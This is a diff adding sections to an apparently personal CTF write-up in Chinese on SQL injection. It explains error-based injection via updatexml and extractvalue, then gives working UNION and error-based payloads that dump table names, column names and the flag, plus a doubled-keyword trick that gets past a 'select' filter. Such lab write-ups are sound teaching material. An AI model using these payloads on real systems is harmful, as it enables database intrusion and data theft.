@@ -43,9 +43,17 @@ scrabble http://example.com/
 - 字符型注入
   在输入参数前后加了引号。若输入参数为1，查询语句为 =select * from table where id = '1'= 。可以通过补全引号后在后面加union，在最后加上#或者--+注释掉之后的内容。
 
+- 报错注入
+  mysql中 =updatexml= 函数是用于更新xml文档的函数，语法是 =updatexml(目标xml文档, xml内路径, 更新的内容)= 第二个参数应该为合法的xpath路径，否则会报错同时输出传入的参数。可以用 =concat= 在语句前拼接一个 ='~'= 构造一个非法的xpath，系统会执行后面语句后返回结果，就变成了普通的字符型注入。
+
+
 ** SQL注入-1
 先测试一下，发现只有id=1, 2, 3的时候有内容。id=3的时候提示有后门参数tips，tips=1会显示出执行的sql语句。
 
 [[/img/2021-12-29_sql1-tips.png]]
 
 可以看出是字符形式的注入。执行 =select * from notes where id ='-1' union select 1,2, group_concat(table_name) from information_schema.tables where table_schema=database()#'= 获取表名，查到有个表 =fl4g= 。要注意select出来的个数必须为3，直接 =select *= 查不到东西。应该是后台过滤了参数必须为3个，并且只有后面两个会显示，所以查出来的 =table_name= 也要用 =group_concat= 合并为一个字段。拿到表名后执行 =select * from notes where id ='4' union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'fl4g' #'= 获取到列名为fllllag。最后执行 =select * from notes where id = '4' union select 1,2,fllllag from fl4g= 就能获取flag。
+** SQL注入-2
+看源码发现提示，参数加入 =&tips=1= 的时候会返回报错信息，是报错注入，如果不加提示就是基于时间的盲注。先来看用提示的。
+
+随便输入用户名会提示账号不存在，用户名输admin提示账号或密码错误。注入点在用户名。执行 =name=admin' and (select extractvalue(1,concat(0x7e,(database()))))--+&pass=123= 拿到库名 =note= ， =name=admin' and extractvalue(1,concat(0x7e,select group_concat(table_name) from information_schema.tables where table_schema = 'note'))--+&pass=123= 拿表名。看错误提示猜测 =select= 被过滤了，用双写 =selselectect= 替换 =select= 拿到表名 =fl4g= 。 =name=admin' and (selselectect extractvalue(1,concat(0x7e,(seleselectct group_concat(column_name) from information_schema.columns where table_name = 'fl4g'))))--+&pass=123= 拿到列名 =flag= ， =name=admin' and(select extractvalue(1,concat(0x7e,(selselectect group_concat(flag) from fl4g))))--+&pass=123= 拿到flag。
